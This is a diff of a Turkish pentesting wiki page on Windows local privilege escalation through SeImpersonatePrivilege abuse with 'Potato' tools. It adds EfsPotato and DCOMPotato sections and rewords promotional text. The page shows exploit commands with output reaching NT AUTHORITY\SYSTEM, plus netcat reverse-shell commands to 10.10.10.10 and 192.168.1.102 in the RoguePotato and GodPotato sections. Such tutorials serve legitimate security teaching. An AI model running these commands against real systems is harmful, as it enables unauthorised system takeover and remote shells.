@@ -19,9 +19,9 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) **karanlık ağ** destekli bir arama motorudur ve bir şirketin veya müşterilerinin **zarar görüp görmediğini** kontrol etmek için **ücretsiz** işlevler sunar.
+[**WhiteIntel**](https://whiteintel.io) **karanlık ağ** destekli bir arama motorudur ve bir şirketin veya müşterilerinin **çalıntı** **malware'ler** tarafından **tehdit edilip edilmediğini** kontrol etmek için **ücretsiz** işlevler sunar.
 
-WhiteIntel'in ana hedefi, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.
+WhiteIntel'in ana hedefi, bilgi çalan malware'lerden kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.
 
 Web sitelerini kontrol edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:
 
@@ -30,7 +30,7 @@ Web sitelerini kontrol edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:
 ***
 
 {% hint style="warning" %}
-**JuicyPotato,** Windows Server 2019 ve Windows 10 build 1809 ve sonrasında **çalışmaz**. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) aynı ayrıcalıkları **kullanmak ve `NT AUTHORITY\SYSTEM`** düzeyinde erişim sağlamak için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine ele alıyor; bu araç, JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 hostlarında taklit ayrıcalıklarını kötüye kullanmak için kullanılabilir.
+**JuicyPotato,** Windows Server 2019 ve Windows 10 build 1809 ve sonrasında **çalışmaz**. Ancak, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** aynı ayrıcalıkları kullanmak ve `NT AUTHORITY\SYSTEM` düzeyinde erişim sağlamak için kullanılabilir. Bu [blog yazısı](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) `PrintSpoofer` aracını derinlemesine ele alıyor; bu araç, JuicyPotato'nun artık çalışmadığı Windows 10 ve Server 2019 host'larında taklit ayrıcalıklarını kötüye kullanmak için kullanılabilir.
 {% endhint %}
 
 ## Hızlı Demo
@@ -61,8 +61,8 @@ c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f
 {% endcode %}
 
 ### SharpEfsPotato
-```
-SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
+```bash
+> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
 SharpEfsPotato by @bugch3ck
 Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
 
@@ -79,11 +79,34 @@ df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
 C:\temp>type C:\temp\w.log
 nt authority\system
 ```
+### EfsPotato
+```bash
+> EfsPotato.exe "whoami"
+Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
+Part of GMH's fuck Tools, Code By zcgonvh.
+CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]
+
+[+] Current user: NT Service\MSSQLSERVER
+[+] Pipe: \pipe\lsarpc
+[!] binding ok (handle=aeee30)
+[+] Get Token: 888
+[!] process with pid: 3696 created.
+==============================
+[x] EfsRpcEncryptFileSrv failed: 1818
+
+nt authority\system
+```
 ### GodPotato
+```bash
+> GodPotato -cmd "cmd /c whoami"
+# You can achieve a reverse shell like this.
+> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
-GodPotato -cmd "cmd /c whoami"
-GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
-```
+### DCOMPotato
+
+![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)
+
+
 ## Referanslar
 
 * [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
@@ -91,12 +114,14 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 * [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
 * [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
 * [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
+* [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
+* [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
 
 ### [WhiteIntel](https://whiteintel.io)
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io), bir şirketin veya müşterilerinin **stealer malwares** tarafından **tehdit altına alınıp alınmadığını** kontrol etmek için **ücretsiz** işlevler sunan **karanlık ağ** destekli bir arama motorudur.
+[**WhiteIntel**](https://whiteintel.io) , bir şirketin veya müşterilerinin **stealer malwares** tarafından **tehdit edilip edilmediğini** kontrol etmek için **ücretsiz** işlevsellikler sunan **karanlık ağ** destekli bir arama motorudur.
 
 WhiteIntel'in ana hedefi, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirme ve fidye yazılımı saldırılarıyla mücadele etmektir.
 
@@ -105,8 +130,8 @@ Web sitelerini kontrol edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:
 {% embed url="https://whiteintel.io" %}
 
 {% hint style="success" %}
-AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
